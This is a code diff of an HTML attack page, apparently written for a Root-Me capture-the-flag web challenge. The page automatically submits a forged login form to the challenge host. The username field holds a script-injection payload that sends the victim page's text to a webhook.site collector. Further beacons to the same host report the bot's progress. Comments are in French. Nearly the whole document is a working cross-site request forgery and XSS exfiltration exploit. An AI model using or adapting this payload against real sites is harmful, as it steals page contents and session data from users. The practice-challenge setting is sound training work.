@@ -1,12 +1,30 @@
+<form
+  id="f"
+  method="POST"
+  action="http://challenge01.root-me.org:58003/login"
+  target="loginP">
 
-<form id=f method=POST action="http://challenge01.root-me.org:58003/login" target="_self">
-  <input name=username value="<script>new Image().src=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.body.innerText}`</script>">
+  <input
+    name="username"
+    value="<script>addEventListener('load',()=>{new Image().src='https://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c='+encodeURIComponent(document.body.innerText)})</script>">
 </form>
 
 <script>
-window.open('http://challenge01.root-me.org:58003/login','loginP');
-setTimeout(function(){
-  var f=document.getElementById('f');
-  f.submit();
-},3000);
+// Balise pour vérifier que le bot visite bien cette page
+new Image().src =
+  "https://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?stage=loaded";
+
+// Ouvre un contexte de navigation sur la cible
+window.open(
+  "http://challenge01.root-me.org:58003/profile",
+  "loginP"
+);
+
+// Envoie ensuite le login POST dans cette fenêtre
+setTimeout(() => {
+  new Image().src =
+    "https://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?stage=submitting";
+
+  document.getElementById("f").submit();
+}, 3000);
 </script>
